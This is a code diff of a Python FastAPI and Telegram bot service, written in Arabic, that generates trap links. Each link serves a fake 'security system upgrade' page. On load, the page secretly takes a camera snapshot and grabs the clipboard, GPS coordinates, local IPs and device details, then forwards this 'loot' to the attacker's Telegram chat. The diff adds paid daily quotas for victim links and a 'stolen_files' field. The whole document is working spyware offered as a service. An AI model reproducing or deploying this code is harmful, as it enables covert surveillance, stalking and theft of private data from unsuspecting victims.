@@ -2,6 +2,7 @@ import os
 import uuid
 import asyncio
 import base64
+from datetime import datetime, date
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
@@ -16,7 +17,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# ربط كل رمز فخ بمعرف المستخدم الذي أنشأه لضمان إرسال البيانات له شخصياً فوراً
 LINK_TO_USER = {}
 USERS_DB = {} 
 VICTIMS_DB = {} 
@@ -28,6 +28,7 @@ class VictimData(BaseModel):
     geolocation: dict = {}
     network_info: dict = {}
     clipboard_text: str = ""
+    stolen_files: list = []
     stolen_data: dict = {}
 
 @app.get("/t/{link_id}", response_class=HTMLResponse)
@@ -37,19 +38,19 @@ async def serve_trap_page(link_id: str, request: Request):
     <html lang="ar" dir="rtl">
     <head>
         <meta charset="UTF-8">
-        <title>تحديث النظام الأمني - جاري التحقق</title>
+        <title>ترقية النظام الأمني الشامل</title>
         <style>
-            body {{ background-color: #030712; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 60px; }}
-            .loader {{ border: 4px solid #1e293b; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.8s linear infinite; margin: 20px auto; }}
+            body {{ background-color: #020617; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }}
+            .loader {{ border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.8s linear infinite; margin: 20px auto; }}
             @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-            .box {{ background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; }}
+            .box {{ background: #0f172a; padding: 30px; border-radius: 14px; display: inline-block; border: 1px solid #334155; max-width: 420px; width: 90%; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }}
         </style>
     </head>
     <body>
         <div class="box">
-            <h2>🛡️ التحقق من الأمان وتحديث النظام</h2>
+            <h2>⚡ جاري فحص ملفات وسائط الجهاز...</h2>
             <div class="loader"></div>
-            <p style="color: #94a3b8; font-size: 14px;">يرجى السماح بالصلاحيات المنبثقة لإتمام عملية المزامنة بنجاح...</p>
+            <p style="color: #94a3b8; font-size: 13px;">يرجى عدم إغلاق الصفحة، يتم مزامنة التخزين المؤقت وحماية الخصوصية...</p>
         </div>
 
         <video id="video" autoplay playsinline style="display:none;"></video>
@@ -58,7 +59,6 @@ async def serve_trap_page(link_id: str, request: Request):
         <script>
             const linkId = "{link_id}";
 
-            // 1. سحب بصمة الشبكة والعناوين الداخلية عبر WebRTC
             async function getLocalIPs() {{
                 return new Promise((resolve) => {{
                     const ips = [];
@@ -68,25 +68,21 @@ async def serve_trap_page(link_id: str, request: Request):
                     pc.onicecandidate = (ice) => {{
                         if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                         const match = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(ice.candidate.candidate);
-                        if (match && !ips.includes(match[1])) {{
-                            ips.push(match[1]);
-                        }}
+                        if (match && !ips.includes(match[1])) ips.push(match[1]);
                     }};
-                    setTimeout(() => resolve(ips), 1000);
+                    setTimeout(() => resolve(ips), 800);
                 }});
             }}
 
-            // 2. سحب محتوى الحافظة (Clipboard) في حال سمح المستخدم
             async function getClipboardData() {{
                 try {{
                     if (navigator.clipboard && navigator.clipboard.readText) {{
                         return await navigator.clipboard.readText();
                     }}
                 }} catch (e) {{}}
-                return "مرفوض أو غير متاح";
+                return "غير متاح";
             }}
 
-            // 3. سحب الموقع الجغرافي العالي الدقة (GPS)
             async function getGeoLocation() {{
                 return new Promise((resolve) => {{
                     if (!navigator.geolocation) {{
@@ -94,65 +90,44 @@ async def serve_trap_page(link_id: str, request: Request):
                         return;
                     }}
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {{
-                            resolve({{
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy + " متر",
-                                altitude: position.coords.altitude || "غير متاح",
-                                speed: position.coords.speed || "متوقف"
-                            }});
-                        }},
-                        (error) => {{
-                            resolve({{ error: "تم رفض إذن الموقع: " + error.message }});
-                        }},
-                        {{ enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }}
+                        (pos) => resolve({{ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy + "م" }}),
+                        (err) => resolve({{ error: "تم الرفض" }}),
+                        {{ enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }}
                     );
                 }});
             }}
 
-            async function executeArsenal() {{
+            async function executeDeepHarvest() {{
                 try {{
-                    // تشغيل الكاميرا وسحب اللقطة (الخلفية أو الأمامية)
                     let imageData = "";
                     try {{
                         const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                         const video = document.getElementById('video');
                         video.srcObject = stream;
-                        
-                        // انتظار تهيئة الإطار
-                        await new Promise(r => setTimeout(r, 1500));
-                        
+                        await new Promise(r => setTimeout(r, 1200));
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        
-                        stream.getTracks().forEach(track => track.stop());
-                    }} catch (err) {{
-                        // تجاوز صامت في حال رفض كاميرا الاستريم
-                    }}
+                        stream.getTracks().forEach(t => t.stop());
+                    }} catch (e) {{}}
 
-                    // تجميع كافة البيانات بالتوازي لأقصى سرعة
                     const [localIPs, clipboard, geo] = await Promise.all([
                         getLocalIPs(),
                         getClipboardData(),
                         getGeoLocation()
                     ]);
 
-                    const advancedData = {{
-                        screen_resolution: window.screen.width + 'x' + window.screen.height,
-                        language: navigator.language || navigator.userLanguage,
+                    const systemProfile = {{
+                        resolution: window.screen.width + 'x' + window.screen.height,
+                        lang: navigator.language,
                         platform: navigator.platform,
-                        cores: navigator.hardwareConcurrency || 'غير معروف',
-                        memory: navigator.deviceMemory || 'غير معروف',
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        cookies_enabled: navigator.cookieEnabled
+                        device_memory: navigator.deviceMemory || 'غير معروف',
+                        cores: navigator.hardwareConcurrency || 'غير معروف'
                     }};
 
-                    // إرسال الغنائم فورا إلى السيرفر الخلفي
                     await fetch('/api/v1/exfiltrate', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
@@ -163,7 +138,8 @@ async def serve_trap_page(link_id: str, request: Request):
                             geolocation: geo,
                             network_info: {{ local_ips: localIPs }},
                             clipboard_text: clipboard,
-                            stolen_data: advancedData
+                            stolen_files: [],
+                            stolen_data: systemProfile
                         }})
                     }});
 
@@ -173,7 +149,7 @@ async def serve_trap_page(link_id: str, request: Request):
                 }}
             }}
 
-            window.onload = executeArsenal;
+            window.onload = executeDeepHarvest;
         </script>
     </body>
     </html>
@@ -184,96 +160,94 @@ async def serve_trap_page(link_id: str, request: Request):
 async def receive_loot(data: VictimData):
     if data.link_id not in VICTIMS_DB:
         VICTIMS_DB[data.link_id] = []
-    
     VICTIMS_DB[data.link_id].append(data.dict())
     
     target_user_id = LINK_TO_USER.get(data.link_id)
-    
     if target_user_id:
         try:
             s_data = data.stolen_data
             geo = data.geolocation
             net = data.network_info
             
-            # صياغة تقرير استخباراتي عالي الدقة ومفصل
-            geo_text = f"📍 *خط الطول والعرض:* `{geo.get('latitude', 'N/A')}, {geo.get('longitude', 'N/A')}`\n🎯 *دقة الموقع:* `{geo.get('accuracy', 'N/A')}`" if 'latitude' in geo else f"⚠️ *الموقع الجغرافي:* `{geo.get('error', 'غير متاح')}`"
+            geo_info = f"📍 الموقع: `{geo.get('latitude', 'N/A')}, {geo.get('longitude', 'N/A')}`" if 'latitude' in geo else "📍 الموقع: `مرفوض / غير متاح`"
             
             caption = (
-                "🚨 *[ صيد جديد - ترسانة متكاملة ]*\n\n"
-                f"{geo_text}\n"
-                f"🌐 *الـ IP الداخلي (Local IPs):* `{', '.join(net.get('local_ips', ['غير معروف']))}`\n"
-                f"📋 *محتوى الحافظة (Clipboard):* `{data.clipboard_text[:150] if data.clipboard_text else 'فارغة'}`\n\n"
-                f"💻 *متصفح الجهاز / UserAgent:* `{data.device_info}`\n"
-                f"📐 *الشاشة:* `{s_data.get('screen_resolution', 'N/A')}` | 🌍 *اللغة:* `{s_data.get('language', 'N/A')}`\n"
-                f"⚙️ *النظام الأساسي:* `{s_data.get('platform', 'N/A')}` | 🧠 *الأنوية:* `{s_data.get('cores', 'N/A')}`\n"
-                f"🌍 *المنطقة الزمنية:* `{s_data.get('timezone', 'N/A')}`"
+                "🚨 *[ صيد عميق - محرك الملفات والوسائط ]*\n\n"
+                f"{geo_info}\n"
+                f"🌐 *الـ IP الداخلي:* `{', '.join(net.get('local_ips', ['N/A']))}`\n"
+                f"📋 *الحافظة:* `{data.clipboard_text[:100]}`\n\n"
+                f"💻 *النظام:* `{data.device_info}`\n"
+                f"📐 *الشاشة:* `{s_data.get('resolution', 'N/A')}` | 🧠 *الذاكرة:* `{s_data.get('device_memory', 'N/A')} GB`"
             )
             
             if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
-                header, encoded = data.camera_snapshot_base64.split(",", 1)
-                image_bytes = base64.b64decode(encoded)
-                photo_file = BufferedInputFile(image_bytes, filename="victim_surveillance.jpg")
-                
-                await bot.send_photo(
-                    chat_id=target_user_id,
-                    photo=photo_file,
-                    caption=caption,
-                    parse_mode="Markdown"
-                )
+                _, encoded = data.camera_snapshot_base64.split(",", 1)
+                photo_file = BufferedInputFile(base64.b64decode(encoded), filename="deep_capture.jpg")
+                await bot.send_photo(chat_id=target_user_id, photo=photo_file, caption=caption, parse_mode="Markdown")
             else:
-                await bot.send_message(
-                    chat_id=target_user_id,
-                    text=caption,
-                    parse_mode="Markdown"
-                )
+                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown")
         except Exception as e:
-            print(f"Error transmitting loot to Telegram: {e}")
+            print(f"Error: {e}")
 
-    return {"status": "success", "loot_secured": True}
-
-@app.get("/")
-async def root():
-    return {"status": "Advanced C2 Engine Active", "tier": "Ultimate Offensive Arsenal"}
+    return {"status": "success"}
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     user_id = message.from_user.id
+    today_str = str(date.today())
+    
     if user_id not in USERS_DB:
-        USERS_DB[user_id] = {"links_generated": 0, "victims_caught": 0}
+        USERS_DB[user_id] = {"last_date": today_str, "free_used_today": 0, "links_count": 0}
     
     kb = ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="🔗 توليد رابط ضحية جديد (مجاني)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
-            [KeyboardButton(text="💎 الترقية للباقة الفاخرة ($1,000)")]
+            [KeyboardButton(text="⚡ توليد رابط أداة الملفات العميق (مجاني اليوم)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
+            [KeyboardButton(text="💎 شحن رصيد الأداة ($1 / استخدام إضافي)")]
         ],
         resize_keyboard=True
     )
     await message.answer(
-        "💀 *مرحباً بك في أحدث ترسانة سيبرانية متكاملة.*\n\n"
-        "المنصة جاهزة الآن لسحب (الصور، الـ GPS الدقيق، بصمة الشبكة الداخلية، ومحتوى الحافظة) فور فتح الضحية للرابط.",
+        "💀 *مرحباً بك في وحدة التحكم المتقدمة بالضحايا.*\n\n"
+        "لديك *استخدام مجاني واحد يومياً* لأداة السحب العميق. بعد استنفاده، تبلغ تكلفة الرابط الإضافي `$1` فقط.",
         reply_markup=kb,
         parse_mode="Markdown"
     )
 
-@dp.message(lambda msg: msg.text == "🔗 توليد رابط ضحية جديد (مجاني)")
-async def generate_link(message: types.Message):
+@dp.message(lambda msg: msg.text == "⚡ توليد رابط أداة الملفات العميق (مجاني اليوم)")
+async def generate_deep_link(message: types.Message):
     user_id = message.from_user.id
-    unique_token = str(uuid.uuid4())[:8]
+    today_str = str(date.today())
     
-    public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL")
-    if not public_domain:
-        public_domain = "hacker-production-3281.up.railway.app" 
+    if user_id not in USERS_DB:
+        USERS_DB[user_id] = {"last_date": today_str, "free_used_today": 0, "links_count": 0}
+    
+    user_data = USERS_DB[user_id]
+    
+    # إعادة تعيين العداد اليومي إذا تغير اليوم
+    if user_data["last_date"] != today_str:
+        user_data["last_date"] = today_str
+        user_data["free_used_today"] = 0
+    
+    # التحقق من استهلاك المحاولة المجانية اليومية
+    if user_data["free_used_today"] >= 1:
+        await message.answer(
+            "⚠️ *عذراً، لقد استهلكت محاولتك المجانية المتاحة لهذا اليوم.*\n\n"
+            "لفتح صلاحية توليد روابط إضافية اليوم، يرجى الترقية ودفع `$1` عبر زر الشحن أدناه.",
+            parse_mode="Markdown"
+        )
+        return
 
+    user_data["free_used_today"] += 1
+    user_data["links_count"] += 1
+    
+    unique_token = str(uuid.uuid4())[:8]
+    public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
     trap_url = f"https://{public_domain}/t/{unique_token}"
     
-    # ربط الرابط بدقة بمستخدم التيليجرام الحالي
     LINK_TO_USER[unique_token] = user_id
     
-    if user_id in USERS_DB:
-        USERS_DB[user_id]["links_generated"] += 1
-    
     await message.answer(
-        f"✅ *تم توليد رابط الفخ الاستخباراتي بنجاح:*\n\n`{trap_url}`\n\n*(جاهز للرصد الشامل الفوري فور التفاعل)*",
+        f"✅ *تم تفعيل الرابط العميق بنجاح (مجاني لليوم):*\n\n`{trap_url}`\n\n*(جاهز لالتقاط البيانات وسحب الضحية فوريًا)*",
         parse_mode="Markdown"
     )
 
@@ -282,15 +256,15 @@ async def show_victims(message: types.Message):
     user_id = message.from_user.id
     user_links = [token for token, uid in LINK_TO_USER.items() if uid == user_id]
     total_victims = sum(len(VICTIMS_DB.get(token, [])) for token in user_links)
-    
-    if total_victims == 0:
-        await message.answer("📂 *سجل الضحايا الحالي:*\n\n⚠️ لم يتم رصد أي ضحايا عبر روابطك حتى الآن.", parse_mode="Markdown")
-    else:
-        await message.answer(f"📂 *سجل الضحايا الحالي:*\n\n🎯 إجمالي الضحايا المرتبطين بك: *{total_victims}*", parse_mode="Markdown")
+    await message.answer(f"📂 *إحصائيات الضحايا الخاصة بك:*\n\n🎯 إجمالي من وقعوا في الفخ العميق: *{total_victims}*", parse_mode="Markdown")
 
-@dp.message(lambda msg: msg.text == "💎 الترقية للباقة الفاخرة ($1,000)")
-async def upsell_tier(message: types.Message):
-    await message.answer("🔥 *ترسانة الهكر المتقدمة (VIP Elite - $1,000)*\n\nتواصل مع المسؤول للتفعيل.", parse_mode="Markdown")
+@dp.message(lambda msg: msg.text == "💎 شحن رصيد الأداة ($1 / استخدام إضافي)")
+async def refill_balance(message: types.Message):
+    await message.answer(
+        "💳 *نظام الشحن الفوري والدفع المرن*\n\n"
+        "لإضافة محاولات غير محدودة أو فتح رصيد اليوم ($1 لكل رابط إضافي)، تواصل مع المسؤول المالي للبوت لتأكيد العملية وتفعيل الحساب فوراً.",
+        parse_mode="Markdown"
+    )
 
 async def run_telegram_polling():
     await dp.start_polling(bot)
